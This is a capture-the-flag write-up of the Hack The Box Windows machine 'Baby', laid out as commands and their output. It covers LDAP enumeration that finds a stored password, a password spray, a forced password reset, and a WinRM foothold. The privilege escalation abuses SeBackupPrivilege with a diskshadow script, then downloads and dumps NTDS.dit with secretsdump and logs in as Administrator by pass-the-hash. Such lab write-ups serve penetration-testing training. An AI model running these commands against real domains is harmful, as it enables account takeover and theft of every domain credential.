# Target
| Category          | Details                                                  |
|-------------------|----------------------------------------------------------|
| 📝 **Name**       | [Baby](https://app.hackthebox.com/machines/Baby)         |  
| 🏷 **Type**       | HTB Machine                                              |
| 🖥 **OS**         | Windows                                                  |
| 🎯 **Difficulty** | Easy                                                     |
| 📁 **Tags**       | LDAP, smbpasswd, SeBackupPrivilege, diskshadow, NTDS.dit |

# Scan
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-22 12:33:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
|_ssl-date: 2025-11-22T12:34:48+00:00; +19s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-22T12:34:08+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51542/tcp open  msrpc         Microsoft Windows RPC
51554/tcp open  msrpc         Microsoft Windows RPC
63589/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
63590/tcp open  msrpc         Microsoft Windows RPC
63599/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 18s, deviation: 0s, median: 18s
| smb2-time: 
|   date: 2025-11-22T12:34:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

# Attack path
1. [Gain initial foothold using credentials discovered in LDAP description field](#gain-initial-foothold-using-credentials-discovered-in-ldap-description-field)
2. [Escalate to `Administrator` user by abusing `SeBackupPrivilege`](#escalate-to-administrator-user-by-abusing-sebackupprivilege)

### Gain initial foothold using credentials discovered in LDAP description field
A cleartext password (`BabyStart123!`) was found stored in the description attribute of the `Teresa Bell` user object. This information was retrieved using `ldapsearch` while authenticated only as the `Guest` account. An initial password-spray attempt using `BabyStart123!` against all accounts with a populated `sAMAccountName` field did not yield valid credentials. Further LDAP enumeration — specifically querying all objects with a defined `dn` attribute — resulted in the discovery of an additional user, `Caroline.Robinson`. Testing the same password for this account returned a `STATUS_PASSWORD_MUST_CHANGE` response, indicating that the credentials were valid but required a password reset. Using `smbpasswd`, the password for `Caroline.Robinson` was successfully updated. The new credentials were then used to obtain an initial foothold on the target system via `evil-winrm-py`.

#### Add `BabyDC.baby.vl` adn `baby.vl` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ echo "$TARGET BabyDC.baby.vl baby.vl" | sudo tee -a /etc/hosts
10.129.5.205 BabyDC.baby.vl baby.vl
```

#### Discover password in `description` field for one of the users in LDAP
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ ldapsearch -x -H ldap://babydc.baby.vl -b "DC=baby,DC=vl" "(objectClass=user)" dn cn description sAMAccountName userPrincipalName 
# extended LDIF
#
# LDAPv3
# base <DC=baby,DC=vl> with scope subtree
# filter: (objectClass=user)
# requesting: dn cn description sAMAccountName userPrincipalName 
#
<SNIP>
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
cn: Teresa Bell
description: Set initial password to BabyStart123!
sAMAccountName: Teresa.Bell
userPrincipalName: Teresa.Bell@baby.vl
<SNIP>
```

#### Get all users with `sAMAccountName` set
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ ldapsearch -x -H ldap://babydc.baby.vl -b "DC=baby,DC=vl" | grep sAMAccountName | grep -v \# | cut -d' ' -f2 > usernames.txt && cat usernames.txt
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

#### Spray `BabyStart123!` password
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ netexec smb baby.vl -u accounts.txt -p 'BabyStart123!'                 
SMB         10.129.5.205    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Allowed:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Cert:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Cloneable:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Denied:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\DnsAdmins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\DnsUpdateProxy:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Domain:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Enterprise:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Group:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Protected:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\RAS:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
```

#### Discover user w/o `sAMAccountName` set
As password spray did not yield any results we need to dig deeper.
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ ldapsearch -x -H ldap://babydc.baby.vl -b "DC=baby,DC=vl" | grep 'dn:'
<SNIP>
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

#### Try discovered password for `Caroline.Robinson` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ netexec smb baby.vl -u Caroline.Robinson -p 'BabyStart123!'
SMB         10.129.5.205    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.5.205    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

#### Change password for `Caroline.Robinson` user to `P@ssword123`
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ smbpasswd -r baby.vl -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

#### Confirm password set
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ netexec smb baby.vl -u Caroline.Robinson -p 'P@ssword123'  
SMB         10.129.5.205    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.5.205    445    BABYDC           [+] baby.vl\Caroline.Robinson:P@ssword123
```

#### Gain foothold with WinRM
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ evil-winrm-py -i baby.vl -u Caroline.Robinson -p 'P@ssword123'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'baby.vl:5985' as 'Caroline.Robinson'
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> whoami
baby\caroline.robinson
```

### Escalate to `Administrator` user by abusing `SeBackupPrivilege`
During post-exploitation enumeration, the user account `Caroline.Robinson` was identified as having the `SeBackupPrivilege` privilege assigned. This right allows a user to perform backup-related operations that can be abused to access protected system files. 
Using this privilege, a DiskShadow Distributed Shell script (.dsh) was executed to generate a shadow copy of the system drive. The script was uploaded and executed via `diskshadow`, resulting in a mounted snapshot accessible through a temporary drive letter.
From the shadow copy, the `NTDS.dit` Active Directory database and the `SYSTEM` registry hive were obtained. The extracted data was processed with `impacket-secretsdump` to retrieve the NTLM hash for the `Administrator` account. The recovered hash was then used to authenticate as the `Administrator`, providing full privileged access to the system.

#### Discover `Caroline.Robinson` user has `SeBackupPrivilege`
```
evil-winrm-py PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

#### Create Distributed Shell File (.dsh) to create copy of C: drive
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ {cat <<'EOF'> copy.dsh
set context persistent nowriters
set metadata c:\\programdata\\test.cab
set verbose on
add volume c: alias copy
create
expose %copy% z:
EOF
} && unix2dos copy.dsh
unix2dos: converting file copy.dsh to DOS format...
```

#### Upload and execute `copy.dsh` using `diskshadow`
```
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> upload copy.dsh .
Uploading /home/magicrc/attack/HTB Baby/copy.dsh: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████| 142/142 [00:00<00:00, 883B/s]
[+] File uploaded successfully as: C:\Users\Caroline.Robinson\Documents\copy.dsh
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> diskshadow /s copy.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  11/23/2025 9:05:51 AM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
-> set verbose on
-> add volume c: alias copy
-> create

Alias copy for shadow ID {c61c7215-8ae2-43c8-a239-10bed6af50d8} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {76989030-ae99-4259-ba09-dfb4e6a41aeb} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisBB5F.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {76989030-ae99-4259-ba09-dfb4e6a41aeb}

        * Shadow copy ID = {c61c7215-8ae2-43c8-a239-10bed6af50d8}               %copy%
                - Shadow copy set: {76989030-ae99-4259-ba09-dfb4e6a41aeb}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 11/23/2025 9:05:52 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %copy% z:
-> %copy% = {c61c7215-8ae2-43c8-a239-10bed6af50d8}
The shadow copy was successfully exposed as z:\.
-> 
```

#### Copy `NTDS.dit` from `Z:` drive
```
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> robocopy /B /NJH /NJS /NDL Z:\Windows\NTDS\ . NTDS.dit
            New File              16.0 m        Z:\Windows\NTDS\ntds.dit
```

#### Copy Windows `SYSTEM` registry hive
```
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save HKLM\SYSTEM SYSTEM.hiv
The operation completed successfully.
```

#### Exfiltrate `NTDS.dit` and `SYSTEM.hiv`
```
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download ntds.dit .
Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit: 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 16.0M/16.0M [00:13<00:00, 1.25MB/s]
[+] File downloaded successfully and saved as: /home/magicrc/attack/HTB Baby/ntds.dit
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download SYSTEM.hiv .
Downloading C:\Users\Caroline.Robinson\Documents\SYSTEM.hiv: 19.6MB [00:15, 1.30MB/s]                                                                                                               
[+] File downloaded successfully and saved as: /home/magicrc/attack/HTB Baby/SYSTEM.hiv
```

#### Use `impacket-secretsdump` to retrieve `Administrator` NTLM hash from `ntds.dit`
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM.hiv LOCAL 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
<SNIP>>
```

#### Gain access as `Administrator` user using NTLM hash
```
┌──(magicrc㉿perun)-[~/attack/HTB Baby]
└─$ evil-winrm-py -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'baby.vl:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
baby\administrator
```
